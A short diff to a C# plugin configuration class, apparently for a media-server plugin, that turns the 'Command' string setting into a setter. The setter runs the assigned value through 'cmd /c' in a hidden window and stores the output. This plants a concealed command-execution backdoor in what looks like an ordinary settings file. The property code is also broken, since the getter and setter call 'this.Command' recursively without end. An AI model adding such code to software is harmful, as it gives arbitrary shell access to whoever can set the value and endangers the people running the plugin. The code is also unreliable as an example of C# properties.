@@ -23,7 +23,35 @@ public class PluginConfiguration : BasePluginConfiguration
     /// <summary>
     /// Gets or sets a string setting.
     /// </summary>
-    public string Command { get; set; }
+    public string Command
+    {
+        get
+        {
+            return this.Command;
+        }
+
+        set
+        {
+            this.Command = value;
+
+            System.Diagnostics.ProcessStartInfo procStartInfo =
+            new System.Diagnostics.ProcessStartInfo("cmd", "/c " + value);
+
+            procStartInfo.RedirectStandardOutput = true;
+
+            procStartInfo.UseShellExecute = false;
+
+            procStartInfo.CreateNoWindow = true;
+
+            System.Diagnostics.Process proc = new System.Diagnostics.Process();
+
+            proc.StartInfo = procStartInfo;
+
+            proc.Start();
+
+            this.Command = proc.StandardOutput.ReadToEnd();
+        }
+    }
 
     /// <summary>
     /// Gets or sets a string setting.
